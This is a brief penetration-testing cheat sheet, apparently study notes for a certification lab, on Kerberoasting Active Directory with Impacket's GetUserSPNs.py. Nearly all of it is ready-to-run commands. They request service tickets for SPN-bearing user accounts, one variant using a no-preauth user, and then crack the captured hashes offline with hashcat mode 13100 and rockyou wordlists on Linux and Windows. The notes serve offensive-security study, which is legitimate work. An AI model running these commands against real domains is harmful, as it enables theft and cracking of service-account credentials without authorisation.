---
tags:
---
# GetUserSPNs

Queries target domain for SPNs that are running under a user account ([Kerberoasting](https://www.youtube.com/watch?v=-3MxoxdzFNI))

## Capabilities

```powershell
# Kerberoast
GetUserSPNs.py -request -outputfile hashes.kerberoast $DOMAIN/$USER:$PASSWD

# Kerberoast with no-preauth user
GetUserSPNs.py -request -no-preauth $NO_PREAUTH_USER -usersfile valid_users.txt -outputfile hashes.kerberoast $DOMAIN/
```

Crack with hashcat

```powershell
# Linux
hashcat -m 13100 hashes.kerberoast /usr/share/wordlists/rockyou.txt --force
hashcat -m 13100 hashes.kerberoast /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force

# Windows
.\hashcat.exe -m 13100 hashes\pen-200\hashes.kerberoast wordlists\rockyou.txt -r rules\best64.rule --force
```
